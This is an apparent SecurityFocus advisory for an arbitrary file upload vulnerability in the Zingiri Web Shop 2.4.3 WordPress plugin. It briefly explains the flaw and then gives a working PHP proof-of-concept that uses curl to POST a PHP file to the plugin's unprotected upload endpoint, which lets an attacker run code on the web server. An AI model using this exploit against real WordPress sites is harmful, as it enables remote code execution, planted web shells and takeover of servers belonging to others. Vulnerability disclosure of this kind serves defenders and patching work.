source: http://www.securityfocus.com/bid/54020/info

Zingiri Web Shop plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Zingiri Web Shop 2.4.3 is vulnerable; other versions may also be affected.

<?php

$uploadfile="lo.php";
 
$ch = curl_init("http://www.exemple.com/wordpress/wp-content/plugins/zingiri-web-shop/fwkfor/ajax/uploadfilexd.php?fh=/&action=save");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('fh'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?> 

